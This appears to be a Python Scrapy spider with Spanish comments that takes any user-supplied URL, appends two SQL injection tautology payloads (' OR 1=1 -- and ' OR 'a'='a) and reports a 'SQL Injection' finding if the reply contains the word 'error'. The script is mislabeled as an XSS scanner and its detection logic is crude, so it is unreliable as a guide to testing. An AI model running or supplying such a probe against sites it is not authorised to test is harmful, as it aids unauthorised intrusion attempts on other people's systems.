import scrapy

class XSSSpider(scrapy.Spider):
    name = 'xsspider'

    def start_requests(self):
        # Obtener la URL proporcionada por el usuario
        url = input("Ingrese la URL a escrapear: ")
        yield scrapy.Request(url=url, callback=self.parse)

    def parse(self, response):
        xss_payloads = ['\' OR 1=1 --', '\' OR \'a\'=\'a']
        for payload in xss_payloads:
            vuln_url = response.url + payload
            yield scrapy.Request(url=vuln_url, callback=self.parse_result)

    def parse_result(self, response):
        # Aquí puedes procesar y analizar la respuesta…
        if 'error' in response.text.lower():
            yield {
                'vulnerability': 'SQL Injection',
                'url': response.url,
                'response': response.text
            }